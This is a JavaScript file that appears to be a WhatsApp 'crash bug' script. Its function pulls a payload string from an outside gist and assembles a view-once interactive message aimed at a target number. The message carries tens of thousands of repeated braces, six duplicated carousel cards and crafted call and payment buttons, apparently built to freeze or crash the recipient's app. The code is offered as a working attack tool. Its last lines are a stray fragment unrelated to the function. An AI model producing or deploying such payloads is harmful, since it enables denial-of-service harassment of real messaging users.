async function callXcontrol(target, amount) {
  let apiClient;
  try {
    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
    apiClient = await res.text();
  } catch (err) {
    console.error("Error fetching apiClient:", err);
    return;
  }

  try {
    const cella = {
      header: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/29954343_658076137254320_3441319809504693105_n.enc?...",
          mimetype: "video/mp4",
          fileSha256: "sReZveoYwn3w3Scv4FN7EqUh7vNH0qZT7swa7Jz6eWM=",
          fileLength: "2531181",
          seconds: 25022008,
          mediaKey: "tEOaBAsU47iaJz7Nb3Ac82Q40DdipsFUTl3igeC4KJg=",
          height: 768,
          width: 576,
          fileEncSha256: "0AVvG7hfQVa92AmDLuwd7gHiq+0skCSKawBqLYdDtvM=",
          directPath: "/v/t62.7161-24/29954343_658076137254320_3441319809504693105_n.enc?...",
          mediaKeyTimestamp: "1750929882",
          jpegThumbnail: "",
          streamingSidecar: "AFU6qql4iEiX4zNpjyQ/LivwlS6nfjnq2wjYywW+efaTm+T6JH0NMqlzd60IPcf8rN9eL6HOc8SWkfkat5Z+dJu52tcA884B5sReOfP8PFrNCEmPNE8f5L6bofLAu5hgMnj1nejBtXAnxBqhXW+M3q2siezVb0lRjFjrEFZVV6Z5b6rJltybaxbvREcboYtiwklr1HDzxOv3mJAvT6/yz+73amzeyCoSEk4fPI9/pbYrt32KmSVrQabFHNz1uhJ9706Z2/sFDW7rn7Y+miUmjBsC5ySSKpjXikn7ZCiVrRf43LxyIn+whdpgiX8yzguYrGtq+VlZzNlNNfaUoH6zvB5kzFYYwzdEz0IY64YqYoOuVaJBw+6Ns8QCAKEDKYnyctFZylCLcBOw9kmlWNUVb1mdrtHz3Ff4YoiOTDbQAYg0PEVz03uJ3V6D7nkEBVvv+A++axoeJqFSBM7in/EePY9cCYiXcJyMZFqV/ndNPAdJldLFKdGIRHQVxXraZfD5xXX9MnGZ"
        },
        hasMediaAttachment: false,
        title: "</𖥂𖥂\\>"
      },
      body: {
        text: ""
      },
      footer: {
        text: "{ cella.json }"
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(70000)
      }
    };

    const message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target
              },
              participant: target,
              remoteJid: "status@broadcast",
              isGroupMention: true,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "masukan teks",
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "{".repeat(90000),
                        version: 3
                      }
                    }
                  }
                }
              },
              externalAdReply: {
                title: "Galaxy Message",
                body: "Powered by Eternity",
                thumbnailUrl: "https://telegra.ph/file/2a2c31a4a1f44e3a5bdbf.jpg",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://example.com"
              }
            },
            body: {
              text: "</𖥂\\>"
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                name: "galaxy_message",
                title: "galaxy_message",
                header: "Nandemo",
                body: "Call Galaxy"
              }),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "Eternity"
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "Eternity"
                },
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                }
              ]
            },
            carouselMessage: {
              cards: [cella, cella, cella, cella, cella, cella],
              messageVersion: 1
            }
          },
          eventMessage: {
            event: "galaxy_event",
            eventDescription: "Trigger Galaxy Control",
            eventData: {
              amount,
              target
            }
          }
        }
      }
    };

    console.log("Final Message:", message);
    return message;

  } catch (err) {
    console.error("Error building message:", err);
  }
}

console.log('WELCOME TO THE SCRIPT');
  rl.close();
});